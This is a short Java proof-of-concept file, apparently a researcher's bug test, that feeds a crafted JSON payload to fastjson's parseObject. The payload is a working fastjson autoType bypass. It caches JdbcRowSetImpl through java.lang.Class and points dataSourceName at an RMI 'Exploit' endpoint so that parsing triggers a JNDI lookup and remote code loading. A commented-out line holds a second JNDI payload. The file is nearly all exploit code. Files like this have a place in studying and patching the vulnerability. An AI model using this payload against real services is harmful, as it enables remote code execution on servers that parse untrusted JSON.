import com.alibaba.fastjson.JSON;

/**
 * @author yuhao5
 * @date 2020-08-14
 */
public class BugTest {
    public static void main(String args[]) {
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        String text1 = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://127.0.0.1:1389/Exploit\"}";
        String payload1 = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "\"f\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1379/Exploit\",\"autoCommit\":true}}";
        JSON.parseObject(payload1);
    }
}
